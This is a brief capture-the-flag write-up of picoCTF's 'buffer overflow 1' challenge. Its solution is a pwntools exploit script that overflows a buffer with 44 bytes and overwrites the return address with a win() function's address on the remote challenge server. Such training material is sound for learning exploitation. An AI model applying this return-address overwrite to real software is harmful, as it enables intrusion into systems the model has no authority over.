# buffer overflow 1
### Description
> Control the return address

### Solution
Causes an overflow and overwrites the return address with a `win()` address.

```
from pwn import *

#file = "./vuln"
host = "saturn.picoctf.net"
port = 57359
context(os = 'linux', arch = 'amd64')
context.log_level = 'debug'

io = remote(host, port)
#io = process(file)
pld = b"A"*44
pld += p32(0x080491f6) #win

io.sendlineafter("string:", pld)

io.interactive()
```

### Writer
[yu1hpa](https://twitter.com/yu1hpa)

